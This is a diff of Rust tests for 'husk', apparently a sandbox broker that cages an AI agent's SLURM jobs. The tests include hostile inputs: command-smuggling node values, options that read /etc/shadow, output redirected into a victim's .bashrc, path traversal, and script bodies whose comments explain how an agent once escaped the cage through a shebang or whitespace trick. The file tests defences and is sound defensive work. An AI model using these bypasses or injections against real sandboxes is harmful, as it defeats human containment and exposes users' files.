+        // guard now also clears what the submitting shell may have set, so the net-off job
+        // is guaranteed the behaviour this test claims rather than merely not given the
+        // name by husk. (`Tests are proxies for contracts`: rewrite to assert the contract.)
+        assert!(
+            !off.contains("export HUSK_NET_SOCK"),
+            "nothing may put a proxy socket in a net-off job's environment: {off}"
+        );
+        assert!(
+            !off.contains("--ro-bind \"$_husk_net_sock\""),
+            "nothing may bind a proxy socket into a net-off job's cage: {off}"
+        );
+        assert!(
+            off.contains("unset HUSK_NET_SOCK"),
+            "a net-off job must also be protected from an INHERITED socket path (B4-3), \
+             which absence of the name from husk's own script never gave it: {off}"
+        );
+
+        let on = wrap_script(BODY_PATH, &[], &[], profile::Profile::SingleNode, "/work", true, &["/work".to_string()], "", "");
+        // The proxy runs OUTSIDE the cage, so it must be started before the guard execs
+        // into bwrap - not after, where it would be inside the thing it is meant to be
+        // outside of.
+        let proxy_at = on.find("--net-proxy").expect("proxy must be started");
+        // The proxy resolves its ALLOWLIST from --workdir, so that argument decides which
+        // settings files govern this job's egress. It must be the trusted project dir. It
+        // used to be "$PWD" — the job's --chdir, which the agent picks within the writable
+        // set — so the confined side chose the policy that confined it, while the
+        // submit-time half of the same decision used the project dir. One boundary, two
+        // origins, is the shape of the bug this whole fix is about.
+        assert!(
+            !on.contains("--workdir \"$PWD\""),
+            "the proxy must not take its allowlist from the agent-influenced cwd: {on}"
+        );
+        assert!(
+            on.contains("--workdir '/work'"),
+            "the proxy must read its allowlist from a husk-quoted literal path, not a \
+             variable resolved inside the job: {on}"
+        );
+        // Anchor on the actual exec line, not the first mention of bwrap: the guard talks
+        // about bwrap in its comments long before it runs it. No leading spaces - the
+        // `\n\` continuations in the Rust literal strip the indentation, so the emitted
+        // guard is flush left.
+        let cage_at = on.find("\nseccomp-wrapper --profile=").expect("cage must be entered");
+        assert!(proxy_at < cage_at, "the proxy must start before the cage is entered");
+        // ...and the relay runs INSIDE, after the re-exec guard has finished.
+        let relay_at = on.find("TCP-LISTEN:3128").expect("relay must be started");
+        let guard_end = on.find("# --- hand off to the agent").expect("guard end");
+        assert!(relay_at < guard_end, "the relay belongs before the agent body");
+        assert!(
+            relay_at > on.find("exit \"$_husk_rc\"").expect("guard exit"),
+            "the relay must be in the RE-EXECED pass, inside the cage, not the outer one"
+        );
+        assert!(on.contains("bind=127.0.0.1"), "the relay must listen on loopback only: {on}");
+        assert!(on.contains("HTTPS_PROXY=http://127.0.0.1:3128"), "{on}");
+    }
+
+    #[test]
+    fn the_guard_always_binds_a_socat_into_the_cage() {
+        // THE BUG THIS EXISTS FOR, twice over. install-husk.sh builds socat into
+        // <prefix>/bin, under the user's HOME, and the cage tmpfs-masks /users - so
+        // husk's own socat is invisible exactly where the relay needs it.
+        //
+        // The first fix bound it only when `command -v socat` found nothing. That was
+        // wrong for a subtler reason: the guard runs OUTSIDE the cage with the login PATH
+        // carried by --export=ALL, so `command -v` FINDS the socat in /users, takes the
+        // "already available" branch, and binds nothing - after which the cage masks it.
+        // Reasoning about what will be visible inside the cage is the mistake; binding
+        // unconditionally removes the reasoning.
+        let on = wrap_script(BODY_PATH, &[], &[], profile::Profile::SingleNode, "/work", true, &["/work".to_string()], "", "");
+        assert!(on.contains("export HUSK_SOCAT="), "the relay learns the path by env: {on}");
+        assert!(
+            on.contains("_husk_extra+=(--ro-bind \"$_husk_socat_src\""),
+            "socat must be BOUND, and from whatever path was resolved: {on}"
+        );
+        assert!(
+            !on.contains("_husk_socat=$(command -v socat)"),
+            "a socat found on PATH must still be bound - PATH says nothing about what is \
+             visible inside the cage: {on}"
+        );
+
+        // NO LEAKED PLACEHOLDERS. `net_start` is interpolated into the guard, and
+        // `format!` substitutes ONCE - so a placeholder inside it is never expanded. That
+        // shipped a literal `[ -x {socat_q} ]`, valid shell testing a file named
+        // "{socat_q}", so the bind silently never happened. An earlier version of this
+        // test asserted `contains("/socat")` and passed on the DESTINATION path while the
+        // source was broken.
+        for leaked in ["{socat_q}", "{broker_q}", "{stub_q}", "{workdir_q}", "{net_start}"] {
+            assert!(!on.contains(leaked), "placeholder {leaked} reached the guard: {on}");
+        }
+        // The fallback source - husk's own build - must be a real absolute path.
+        let fb = on
+            .find("_husk_socat_src=")
+            .map(|i| &on[i..])
+            .and_then(|t| t.find("|| _husk_socat_src=").map(|j| &t[j + 19..]))
+            .expect("a fallback socat path must be emitted");
+        assert!(
+            fb.starts_with('\'') && fb[1..].starts_with('/'),
+            "the fallback socat must be an absolute, quoted path: {}",
+            &fb[..fb.len().min(60)]
+        );
+    }
+
+    #[test]
+    fn every_variable_the_guard_uses_is_defined_before_it_is_used() {
+        // `bash -n` does NOT catch this: an unset variable expands to the empty string and
+        // the script still parses. It cost a Balfrin run - moving the proxy start above the
+        // step-pair block left `_husk_broker` assigned BELOW its first use, so the guard ran
+        // an empty command and reported only "line 43: : command not found". No proxy
+        // started, and three network arms failed for a reason none of them could see.
+        let on = wrap_script(BODY_PATH, &[], &[], profile::Profile::SingleNode, "/work", true, &["/work".to_string()], "", "");
+        // `_husk_log` has exactly the shape that caused this: it is assigned in the hoisted
+        // preamble and first USED inside `net_start`, which is interpolated above the
+        // step-pair block. Get the order wrong and both the proxy and the step-broker
+        // redirect into the empty string.
+        for var in ["_husk_spool", "_husk_broker", "_husk_stub", "_husk_log"] {
+            let def = on
+                .find(&format!("{var}="))
+                .unwrap_or_else(|| panic!("{var} is never assigned:\n{on}"));
+            if let Some(used) = on.find(&format!("\"${var}\"")) {
+                assert!(
+                    def < used,
+                    "{var} is used before it is assigned - it would expand to the empty \
+                     string and the failure would be a bare `: command not found`"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn the_generated_script_is_valid_shell_with_and_without_egress() {
+        // The guard is shell generated from Rust, and a quoting mistake in it has taken
+        // every job down before. `bash -n` is cheap and catches the whole class.
+        for net in [false, true] {
+            let script = wrap_script(
+                BODY_PATH,
+                &[],
+                &["--ro-bind".into(), "/".into(), "/".into()],
+                profile::Profile::SingleNode,
+                "/work",
+                net,
+                &["/work".to_string()],
+                "", "",
+            );
+            let dir = std::env::temp_dir().join(format!("husk-sh-{}-{net}", std::process::id()));
+            std::fs::create_dir_all(&dir).unwrap();
+            let f = dir.join("job.sh");
+            std::fs::write(&f, &script).unwrap();
+            let out = std::process::Command::new("bash").arg("-n").arg(&f).output().unwrap();
+            assert!(
+                out.status.success(),
+                "generated guard is not valid shell (net={net}): {}",
+                String::from_utf8_lossy(&out.stderr)
+            );
+            let _ = std::fs::remove_dir_all(&dir);
+        }
+    }
+
+    #[test]
+    fn emitted_bwrap_arguments_never_carry_literal_quotes() {
+        // The bug this pins took every job down on Balfrin: the guard built a STRING of
+        // pre-quoted arguments and expanded it unquoted. Unquoted expansion word-splits
+        // but does NOT remove quotes, so bwrap received a path with literal ' characters
+        // and refused to bind it — cage dead, exit 1, no output to explain it.
+        //
+        // Inspecting the generated text cannot catch that (the text looks right); only
+        // running it and reading the ARGUMENTS can. So: ask the harness for a run WITH the
+        // derived stub present, and check what actually arrives.
+        let (code, out, _err) = run_guard_with_stub_ex(
+            "quoting",
+            "#!/bin/sh\nfor a in \"$@\"; do echo \"ARG:$a\"; done\n",
+            true,
+            LIVE_BROKER,
+        );
+        assert_eq!(code, 0, "guard must run: {out}");
+        for line in out.lines().filter_map(|l| l.strip_prefix("ARG:")) {
+            assert!(
+                !line.contains('\''),
+                "bwrap argument carries a literal quote, so the path will not resolve: {line:?}"
+            );
+        }
+        // ...and the bind really was emitted, or this test would prove nothing.
+        assert!(
+            out.contains("ARG:--ro-bind"),
+            "the stub bind must be present when the stub exists: {out}"
+        );
+        assert!(
+            out.lines().any(|l| l.starts_with("ARG:") && l.ends_with("srun-stub.py")),
+            "the stub path must arrive as its own bare argument: {out}"
+        );
+    }
+
+    #[test]
+    fn a_missing_step_pair_does_not_break_the_job() {
+        // The stub is convenience, not containment: if it is absent, srun simply is not
+        // brokered (and fails in the cage for want of a route, the status quo). What must
+        // NOT happen is the cage failing to launch - a bwrap bind whose source is missing
+        // is fatal, which is how the MUNGE mask took every job down.
+        //
+        let (code, out, _err) =
+            run_guard_with_stub_ex("nostub", "#!/bin/sh\necho \"ARGS: $*\"\n", false, LIVE_BROKER);
+        assert_eq!(code, 0, "the job must still run: {out}");
+        assert!(
+            !out.contains("srun-stub.py"),
+            "no stub bind may be emitted when the stub is absent: {out}"
+        );
+        assert!(out.contains("ARGS:"), "the cage command still ran: {out}");
+        // ...and it SAYS SO. Continuing silently is what cost a bring-up round on
+        // 2026-07-31: a job where srun is not brokered looks exactly like one where it
+        // is, until a real srun inside the cage dies with a scheduler error about an
+        // expired allocation (MUNGE masked, no route). The message names the missing
+        // piece so the next person reads a cause instead of guessing one.
+        assert!(
+            _err.contains("srun is NOT brokered"),
+            "an inactive step pair must announce itself: {_err}"
+        );
+        assert!(_err.contains("stub="), "and must name what was missing: {_err}");
+    }
+
+    #[test]
+    fn credential_mask_is_applied_after_the_config_driven_binds() {
+        // Ordering is the security property: bwrap applies binds in order and the last
+        // one wins, so an allowRead that re-exposes a parent directory must not be able
+        // to resurrect MUNGE. The mask therefore has to come AFTER the policy args.
+        let script = wrap_script(
+            BODY_PATH,
+            &[],
+            &["--ro-bind".into(), "/run".into(), "/run".into()],
+            profile::Profile::SingleNode,
+            "/work",
+            false,
+            &["/work".to_string()],
+            "", "",
+        );
+        let line = script
+            .lines()
+            .find(|l| l.contains("seccomp-wrapper"))
+            .expect("guard line");
+        // The cage profile must reach the syscall layer too, not just the mount layer.
+        assert!(
+            line.contains("--profile=single-node"),
+            "guard must pass the profile to seccomp-wrapper: {line}"
+        );
+        // args are sh_quote'd, so they appear as '--ro-bind' '/run' '/run'
+        let policy_arg = line.find("'--ro-bind'").expect("policy arg on the line");
+        let mask = line.find("_husk_extra").expect("extra args on the line");
+        assert!(mask > policy_arg, "mask must follow the config binds: {line}");
+    }
+
+    #[test]
+    fn rejects_multi_node_and_hostile_node_values() {
+        // Multi-node must FAIL rather than be quietly downgraded to one node: a job that
+        // asked for four and ran on one would report success having computed with a
+        // quarter of the resources. Checked on the CLI, in the body, and for values that
+        // are not node counts at all.
+        for argv in [
+            vec!["--partition=preemptible", "-N", "2"],
+            vec!["--partition=preemptible", "-N2"],
+            vec!["--partition=preemptible", "--nodes=4"],
+            vec!["--partition=preemptible", "--nodes=1-4"],
+            vec!["--partition=preemptible", "--nodes=2;evil"],
+        ] {
+            match decide(&req(&argv, "echo hi\n"), &no_uenv(), &FsPolicy::unchecked_for_test(), work()) {
+                Decision::Reject(r) => {
+                    assert!(r.contains("single-node"), "{argv:?} -> {r}");
+                    assert!(r.contains("--nodes=1"), "must teach the fix: {argv:?} -> {r}");
+                }
+                _ => panic!("{argv:?} must be rejected"),
+            }
+        }
+        // ...and in the body, where the directive would otherwise reach slurmd.
+        let body = "#!/bin/bash\n#SBATCH --nodes=2\nsrun hostname\n";
+        match decide(
             &req(&["--partition=preemptible"], body),
             &no_uenv(),
-            &FsPolicy::default(),
+            &FsPolicy::unchecked_for_test(),
+            work(),
+        ) {
+            Decision::Reject(r) => assert!(r.contains("single-node"), "{r}"),
+            _ => panic!("a body #SBATCH --nodes=2 must be rejected"),
+        }
+    }
+
+    #[test]
+    fn single_node_is_forced_not_merely_permitted() {
+        // The cage profile must be true by CONSTRUCTION: `--ntasks N` alone lets the
+        // scheduler spread tasks over nodes, so reading the request is not enough. The
+        // broker emits --nodes=1 whether or not the agent mentioned it, and exactly once.
+        for argv in [
+            vec!["--partition=preemptible"],
+            vec!["--partition=preemptible", "-N", "1"],
+            vec!["--partition=preemptible", "--ntasks=8"],
+        ] {
+            let o = opts(req(&argv, "echo hi\n"), &no_uenv());
+            assert_eq!(
+                o.iter().filter(|x| x.starts_with("--nodes")).count(),
+                1,
+                "exactly one --nodes must be emitted for {argv:?}: {o:?}"
+            );
+            assert!(has(&o, "--nodes=1"), "{argv:?} -> {o:?}");
+        }
+    }
+
+    /// The cage's writable root is `project_dir` — where the human launched husk. It is the
+    /// one value that is bound read-WRITE into every job, and it was the one value nothing
+    /// checked: `is_workdir_allowed` existed, rejected exactly this, and was only ever
+    /// applied to `req.cwd`. Launch husk from a home and every brokered job gets that home
+    /// bound writable, straight through the `--tmpfs /users` floor that exists to hide it —
+    /// `~/.ssh` readable, `~/.bashrc` writable, and the job log the guard keeps there
+    /// precisely BECAUSE the home is masked becomes writable by the job it audits.
+    ///
+    /// Checking the agent's value and not our own is the same mistake in mirror image: the
+    /// boundary must be validated wherever it comes from, including from us.
+    #[test]
+    fn a_write_root_under_the_floor_is_refused() {
+        for root in ["/users", "/users/victim", "//users/victim", "/users/victim/proj"] {
+            let d = decide(
+                &req(&["--partition=preemptible"], "echo hi\n"),
+                &no_uenv(),
+                &FsPolicy::unchecked_for_test(),
+                std::path::Path::new(root),
+            );
+            let msg = match d {
+                Decision::Reject(m) => m,
+                _ => panic!("a job whose write root is {root:?} must be refused"),
+            };
+            assert!(msg.contains("husk"), "the refusal must name husk: {msg}");
+            // The reason has to be THE reason. Before the root was checked this already
+            // "failed", but for an unrelated one — the request cwd was not inside the
+            // writable set — and the message helpfully announced the victim's home AS the
+            // writable set. A refusal that arrives for the wrong reason is a test that
+            // cannot fail, and a message that leaks what it is refusing to protect.
+            assert!(
+                msg.contains("home") || msg.contains("scratch"),
+                "the refusal must say the root is a home and where to run instead: {msg}"
+            );
+            assert!(
+                !msg.contains("Writable here"),
+                "a refused root must not be announced as writable: {msg}"
+            );
+        }
+    }
+
+    /// On a shared cluster the resource envelope IS the threat model, and the partition is
+    /// the control that carries it. `--qos` and `--reservation` both move that envelope out
+    /// from under the partition — a QOS changes priority and limits, a reservation grants
+    /// access to nodes set aside for someone else — and both were `Class::Allowed`: chosen
+    /// by the agent and re-emitted verbatim, while THREAT-MODEL.md said this whole family
+    /// was "forced value wins".
+    #[test]
+    fn the_agent_cannot_move_the_resource_envelope() {
+        for argv in [
+            vec!["--partition=preemptible", "--qos=priority"],
+            vec!["--partition=preemptible", "-qpriority"],
+            vec!["--partition=preemptible", "--reservation=maintenance"],
+        ] {
+            let d = decide(&req(&argv, "echo hi\n"), &no_uenv(), &FsPolicy::unchecked_for_test(), work());
+            let msg = match d {
+                Decision::Reject(m) => m,
+                _ => panic!("{argv:?} moves the resource envelope and must be refused"),
+            };
+            assert!(msg.contains("husk"), "must be attributed: {msg}");
+        }
+        // The same words in the body reach slurmd through no channel at all now, but the
+        // parser must still refuse them rather than skip them.
+        let d = decide(
+            &req(&["--partition=preemptible"], "#SBATCH --qos=priority\nsrun x\n"),
+            &no_uenv(), &FsPolicy::unchecked_for_test(), work(),
+        );
+        assert!(matches!(d, Decision::Reject(_)), "a body --qos must be refused too");
+    }
+
+    /// The read-only verbs were forwarded with the agent's ENTIRE argv, unexamined, into
+    /// another SLURM binary that runs OUTSIDE the cage with the human's full filesystem
+    /// view. "Read-only" is a property of what the command does to the SCHEDULER; it says
+    /// nothing about what its options do to the filesystem. `sacct --completion --file=X`
+    /// reads X. That is a read oracle with husk holding the door.
+    #[test]
+    fn query_verbs_do_not_forward_arbitrary_options() {
+        for argv in [
+            vec!["--completion", "--file=/etc/shadow"],
+            vec!["--batch-script"],
+            vec!["-o", "/users/victim/.bashrc"],
+            vec!["--env-vars"],
+            vec!["--file", "/etc/passwd"],
+        ] {
+            let mut r = req(&["--partition=preemptible"], "echo hi\n");
+            r.tool = "sacct".into();
+            r.argv = argv.iter().map(|s| s.to_string()).collect();
+            match decide(&r, &no_uenv(), &FsPolicy::unchecked_for_test(), work()) {
+                Decision::Reject(m) => assert!(m.contains("husk"), "attributed: {m}"),
+                Decision::Query(a) => panic!("{argv:?} was forwarded to sacct: {a:?}"),
+                _ => panic!("unexpected decision for {argv:?}"),
+            }
+        }
+        // ...while the ordinary read-only use keeps working, per verb.
+        for (tool, argv) in [
+            ("squeue", vec!["-u", "me", "--states=RUNNING"]),
+            ("squeue", vec!["--me", "-o", "%i %T"]),
+            ("sinfo", vec!["-p", "short", "-N", "--long"]),
+            ("sacct", vec!["-j", "123", "--format=JobID,State"]),
+            ("sshare", vec!["-U", "-u", "me"]),
+        ] {
+            let mut r = req(&["--partition=preemptible"], "echo hi\n");
+            r.tool = tool.into();
+            r.argv = argv.iter().map(|s| s.to_string()).collect();
+            let d = decide(&r, &no_uenv(), &FsPolicy::unchecked_for_test(), work());
+            if tool == "sshare" {
+                // -U is not on sshare's list; the point is that it is refused with a
+                // message naming what IS accepted, not that every real option is present.
+                match d {
+                    Decision::Reject(m) => assert!(m.contains("--accounts"), "must list what works: {m}"),
+                    _ => panic!("an option husk does not know must be refused"),
+                }
+            } else {
+                assert!(matches!(d, Decision::Query(_)), "{tool} {argv:?} must still work");
+            }
+        }
+
+        // THE COLLISION the flat table got wrong: -p is --partition in squeue and sinfo,
+        // but --parsable in sacct, where it takes NO value. A shared table that believes -p
+        // consumes an argument eats the -j and then chokes on the bare 123.
+        let mut r = req(&["--partition=preemptible"], "echo hi\n");
+        r.tool = "sacct".into();
+        r.argv = vec!["-p".into(), "-j".into(), "123".into()];
+        match decide(&r, &no_uenv(), &FsPolicy::unchecked_for_test(), work()) {
+            Decision::Query(a) => assert_eq!(a, vec!["sacct", "-p", "--jobs=123"], "{a:?}"),
+            Decision::Reject(m) => panic!("sacct -p is a flag, not a value option: {m}"),
+            _ => panic!("unexpected"),
+        }
+        // ...and the same letter in squeue DOES take one.
+        let mut r = req(&["--partition=preemptible"], "echo hi\n");
+        r.tool = "squeue".into();
+        r.argv = vec!["-p".into(), "short".into()];
+        match decide(&r, &no_uenv(), &FsPolicy::unchecked_for_test(), work()) {
+            Decision::Query(a) => assert_eq!(a, vec!["squeue", "--partition=short"], "{a:?}"),
+            other => panic!("squeue -p short must work: {}", matches!(other, Decision::Reject(_))),
+        }
+    }
+
+    /// Every option husk claims to accept must actually survive husk's own vetting, for
+    /// every verb, in both spellings. Cheap and complete: the table is the only source, so
+    /// this cannot drift from it, and it catches an option listed under `value` that should
+    /// be a `flag` (or the reverse) — the class that made `sacct -p` mangle its own argv.
+    ///
+    /// What it CANNOT catch is whether the real tool has that option at all. There is no
+    /// SLURM here, so a typo in the table looks identical to a correct entry. That is what
+    /// `query.parity` on a cluster is for.
+    #[test]
+    fn every_allowed_query_option_is_accepted() {
+        for tool in husk_slurm_broker::READONLY_SLURM {
+            let spec = query_spec(tool).expect("every brokered read-only verb needs a spec");
+            for opt in spec.flag {
+                let got = vet_query_argv(tool, &[opt.to_string()])
+                    .unwrap_or_else(|e| panic!("{tool} {opt} is on its own flag list: {e}"));
+                assert_eq!(got, vec![tool.to_string(), opt.to_string()]);
+            }
+            for opt in spec.value {
+                // separated form
+                let got = vet_query_argv(tool, &[opt.to_string(), "x".into()])
+                    .unwrap_or_else(|e| panic!("{tool} {opt} <value>: {e}"));
+                let want = if opt.starts_with("--") { format!("{opt}=x") } else {
+                    let i = spec.value.iter().position(|o| o == opt).unwrap();
+                    format!("{}=x", spec.value[i + 1])
+                };
+                assert_eq!(got, vec![tool.to_string(), want], "{tool} {opt}");
+                // and `--opt=value`, which only the long spellings have
+                if opt.starts_with("--") {
+                    vet_query_argv(tool, &[format!("{opt}=x")])
+                        .unwrap_or_else(|e| panic!("{tool} {opt}=x: {e}"));
+                }
+            }
+            // No option may be on both lists: that is the arity confusion in miniature.
+            for opt in spec.value {
+                assert!(!spec.flag.contains(opt), "{tool} {opt} is both a flag and a value");
+            }
+        }
+    }
+
+    /// The other half, and the one with teeth: anything that names a FILE must be refused,
+    /// on every verb, whatever husk otherwise allows.
+    #[test]
+    fn no_query_option_can_carry_a_path() {
+        for tool in husk_slurm_broker::READONLY_SLURM {
+            for argv in [
+                vec!["--file=/etc/passwd"],
+                vec!["--completion"],
+                vec!["--batch-script"],
+                vec!["-o", "/tmp/x"],
+                vec!["--format=/tmp/x"],
+                vec!["/etc/passwd"],
+                vec!["-j", "../../etc/passwd"],
+            ] {
+                let a: Vec<String> = argv.iter().map(|s| s.to_string()).collect();
+                assert!(
+                    vet_query_argv(tool, &a).is_err(),
+                    "{tool} {argv:?} must be refused - it can name a path"
+                );
+            }
+        }
+    }
+
+    /// Submit `body` and return the script husk hands to sbatch.
+    fn submitted(body: &str) -> String {
+        match decide(
+            &req(&["--partition=preemptible"], body),
+            &no_uenv(),
+            &FsPolicy::unchecked_for_test(),
+            work(),
         ) {
             Decision::Submit(s) => s.wrapped_script,
-            _ => panic!("reject"),
-        };
-        let d = w.find("#SBATCH --nodes=1").expect("directive kept");
-        let g = w.find("_HUSK_RESANDBOXED").expect("guard injected");
-        let c = w.find("srun hostname").expect("agent command kept");
-        assert!(d < g, "directive must precede the guard (so sbatch still parses it)");
-        assert!(g < c, "guard must precede the first agent command");
+            _ => panic!("expected a submission for {body:?}"),
+        }
+    }
+
+    /// Bodies that each defeated the old `head + guard + tail` shape. The first two are the
+    /// review's CRITICALs; the rest are the same trick in the other whitespace characters
+    /// Rust's `trim_start` treats as blank and `bash` does not.
+    const HOSTILE_BODIES: &[&str] = &[
+        "#!/usr/bin/env -S bash -c \"MARKER_AGENT_BYTES\"\n",
+        "\u{000C}# ; MARKER_AGENT_BYTES\n",
+        "\u{000B}# ; MARKER_AGENT_BYTES\n",
+        "\u{00A0}# ; MARKER_AGENT_BYTES\n",
+        "\r# ; MARKER_AGENT_BYTES\n",
+        "#!/bin/bash\nMARKER_AGENT_BYTES\n",
+        "#SBATCH --nodes=1\nMARKER_AGENT_BYTES\n",
+        "\n\n   \n# comment\nMARKER_AGENT_BYTES\n",
+    ];
+
+    /// THE invariant that closes all three demonstrated bypasses at once.
+    ///
+    /// The old shape was `head + guard + tail`: husk split the agent's body on "leading
+    /// comment or blank", put the front half ABOVE its guard and the rest below. That gave
+    /// the agent two ways to run before the cage existed — keep its own `#!` line (the
+    /// kernel honours it and never reads the guard) or start a line with a character Rust's
+    /// `trim_start` calls whitespace and bash does not, which lands the payload in the head.
+    ///
+    /// Neither is a quoting bug, so neither is fixed by quoting harder. The property to hold
+    /// is structural: **the bytes slurmstepd executes are husk's, entirely.** The agent's
+    /// body is data, read by an interpreter husk names, inside the cage.
+    #[test]
+    fn submitted_script_contains_no_agent_bytes() {
+        for body in HOSTILE_BODIES {
+            let w = submitted(body);
+            assert!(
+                !w.contains("MARKER_AGENT_BYTES"),
+                "agent bytes reached the submitted script.\nbody: {body:?}\nscript:\n{w}"
+            );
+        }
+    }
+
+    /// Corollary, stated separately because it is the half an attacker aims at: whatever the
+    /// body starts with, line 1 of what slurmstepd executes is husk's.
+    #[test]
+    fn submitted_script_starts_with_husks_own_shebang() {
+        for body in HOSTILE_BODIES {
+            let w = submitted(body);
+            assert!(
+                w.starts_with("#!/bin/bash\n"),
+                "husk must author line 1.\nbody: {body:?}\nscript starts: {:?}",
+                &w[..w.len().min(80)]
+            );
+        }
+    }
+
+    /// The agent's `#SBATCH` lines must not reach slurmd's parser at all. husk reads them,
+    /// validates them, and re-emits what it allows onto the command line — where sbatch
+    /// precedence (CLI > env > `#SBATCH`) means husk's value wins by construction. Leaving
+    /// the agent's copy in the script is what made every `Ignored` option an ungated
+    /// channel, and what let a non-option token (`hetjob`) through the body gate.
+    #[test]
+    fn submitted_script_carries_no_agent_directives() {
+        let w = submitted("#SBATCH --nodes=1\n#SBATCH --mail-user=a@b.c\nsrun hostname\n");
+        assert!(!w.contains("--mail-user"), "an agent directive reached slurmd:\n{w}");
+        assert!(
+            !w.contains("#SBATCH"),
+            "the submitted script must carry no #SBATCH at all:\n{w}"
+        );
+    }
+
+    #[test]
+    fn guard_precedes_the_body_and_runs_it_inside_the_cage() {
+        let w = submitted("#!/bin/bash\nsrun hostname\n");
+        let g = w.find("_husk_body").expect("the guard must name the body file");
+        let b = w.find("bwrap").expect("the guard must build a cage");
+        assert!(b < w.len(), "{w}");
+        assert!(g > 0, "{w}");
     }
 
     // ---- security regressions from the v0.4.0 review (group B) ----
@@ -412,10 +6650,93 @@ mod tests {
 
     #[test]
     fn forces_safe_over_glued_short_output() {
-        // F13: glued `-o<path>`/`-e<path>` must not survive to override the forced --output.
-        let o = opts(req(&["--partition=preemptible", "-o/users/victim/.bashrc"], "echo hi\n"), &no_uenv());
-        assert!(!o.iter().any(|x| x.contains("/users/victim/.bashrc")), "glued -o leaked: {o:?}");
-        assert!(has(&o, "--output=/work/slurm-%j.out"));
+        // F13: a glued `-o<path>` must not reach slurmd. The job may now CHOOSE an output
+        // path, but only inside its working directory, so an escape is REFUSED rather
+        // than silently overridden — loud beats quiet, and the glued spelling must not
+        // be the thing that sneaks past.
+        let d = decide(
+            &req(&["--partition=preemptible", "-o/users/victim/.bashrc"], "echo hi\n"),
+            &no_uenv(),
+            &FsPolicy::unchecked_for_test(),
+            work(),
+        );
+        match d {
+            Decision::Reject(why) => {
+                assert!(why.contains("--output"), "must name the option: {why}");
+                assert!(
+                    why.contains("outside") || why.contains("resolve"),
+                    "must say why it was refused: {why}"
+                );
+            }
+            _ => panic!("a glued -o pointing outside the workdir must be rejected"),
+        }
+    }
+
+    #[test]
+    fn resource_directives_in_the_body_reach_slurm() {
+        // **THE PRODUCTION OUTAGE, 2026-08-05.** husk interpreted the CLI only. Body
+        // `#SBATCH` lines were parsed — that is how an unknown or Forced directive gets
+        // rejected by name — and then their resource options were DROPPED: validated as
+        // acceptable, never re-emitted. `wrap_script`'s comment claimed the opposite.
+        //
+        // It was silent, which is what made it expensive. The job RAN, on SLURM's
+        // defaults: a script asking for `--ntasks=64` got one task and 2 CPUs of a
+        // 256-CPU node, `SLURM_NTASKS` came back empty, and nothing said husk had dropped
+        // anything — so the agent that hit it concluded husk was capping CPUs, which was a
+        // reasonable reading of the only evidence available to it.
+        //
+        // EVERY REAL RUN SCRIPT USES DIRECTIVES. The CLI path had tests; this one did not,
+        // so a green suite coexisted with the normal path being broken (P9).
+        let root = icon_workdir("bodyres");
+        let body = "#!/bin/bash -l\n\
+                    #SBATCH --ntasks=64\n\
+                    #SBATCH --cpus-per-task=2\n\
+                    #SBATCH --mem=64G\n\
+                    srun ./a.out\n";
+        let opts = opts_in(&root, req_in(&root, &["--partition=preemptible"], body), &no_uenv());
+        for want in ["--ntasks=64", "--cpus-per-task=2", "--mem=64G"] {
+            assert!(has(&opts, want), "a body resource directive must reach sbatch: {opts:?}");
+        }
+
+        // Precedence is sbatch's own — CLI > env > #SBATCH — so a CLI value overrides the
+        // directive rather than appearing beside it. Two `--ntasks` on one command line
+        // would let the last one win by accident instead of by rule.
+        let both = opts_in(
+            &root,
+            req_in(&root, &["--partition=preemptible", "--ntasks=8"], body),
+            &no_uenv(),
+        );
+        assert!(has(&both, "--ntasks=8"), "the CLI must win: {both:?}");
+        assert!(!has(&both, "--ntasks=64"), "the directive must not survive beside it: {both:?}");
+        // …and an option the CLI did NOT mention still comes through from the body.
+        assert!(has(&both, "--cpus-per-task=2"), "unrelated directives are kept: {both:?}");
+
+        // husk's own forced options still outrank both channels.
+        assert!(has(&both, "--nodes=1"), "the cage profile still forces its topology");
+
+        let _ = std::fs::remove_dir_all(&root);
+    }
+
+    #[test]
+    fn an_invalid_body_directive_value_is_rejected_rather_than_ignored() {
+        // The other half: now that directives are interpreted, a bad VALUE must reject
+        // rather than silently vanish. Previously the whole class was dropped, so a typo
+        // and a valid request were indistinguishable — both produced SLURM's defaults.
+        let root = icon_workdir("bodybad");
+        let d = decide(
+            &req_in(&root, &["--partition=preemptible"], "#!/bin/bash\n#SBATCH --ntasks=lots\n"),
+            &no_uenv(),
+            &FsPolicy::unchecked_for_test(),
+            &root,
+        );
+        match d {
+            Decision::Reject(m) => assert!(
+                m.contains("#SBATCH"),
+                "the refusal must say which channel the bad value came from: {m}"
+            ),
+            _ => panic!("an invalid body directive value must be rejected, not ignored"),
+        }
+        let _ = std::fs::remove_dir_all(&root);
     }
 
     #[test]
@@ -437,16 +6758,20 @@ mod tests {
     }
 
     #[test]
-    fn forced_cli_dominates_body_output_and_chdir() {
-        // ICON (and most HPC run scripts) carry `#SBATCH --output=<their log>`. Accept the
-        // job and force our own safe paths on the CLI, which outrank the directives — the
-        // agent's path must not appear in the submitted options.
+    fn a_body_output_pointing_at_a_home_is_refused() {
+        // The sharp case, and the reason this option is not merely cosmetic: slurmd
+        // writes --output AS THE USER and OUTSIDE the cage, so an unconfined value is an
+        // uncaged arbitrary-write primitive — job stdout into ~/.bashrc is AV2 with the
+        // cage bypassed. A body directive must not achieve it either.
         let body = "#!/bin/bash\n#SBATCH --partition=preemptible\n\
                     #SBATCH --output=/users/victim/.bashrc\n#SBATCH --chdir=/\necho hi\n";
-        let o = opts(req(&[], body), &no_uenv());
-        assert!(has(&o, "--output=/work/slurm-%j.out"), "forced --output missing: {o:?}");
-        assert!(has(&o, "--chdir=/work"), "forced --chdir missing: {o:?}");
-        assert!(!o.iter().any(|x| x.contains(".bashrc")), "agent --output leaked: {o:?}");
+        match decide(&req(&[], body), &no_uenv(), &FsPolicy::unchecked_for_test(), work()) {
+            Decision::Reject(why) => assert!(
+                why.contains("--chdir") || why.contains("--output"),
+                "must name the offending option: {why}"
+            ),
+            _ => panic!("a body --output into a home must be rejected"),
+        }
     }
 
     #[test]
@@ -478,14 +6803,17 @@ mod tests {
         let wrap_arg = format!("--wrap={cmd}");
         let mut r = req(&["--partition=preemptible", wrap_arg.as_str()], cmd);
         r.script = Script { source: "wrap".into(), name: None, body: cmd.into() };
-        match decide(&r, &no_uenv(), &FsPolicy::default()) {
+        match decide(&r, &no_uenv(), &FsPolicy::unchecked_for_test(), work()) {
             Decision::Submit(sub) => {
                 assert!(
                     !sub.options.iter().any(|x| x.contains("--wrap")),
                     "--wrap leaked into the forced options (cage bypass): {:?}",
                     sub.options
                 );
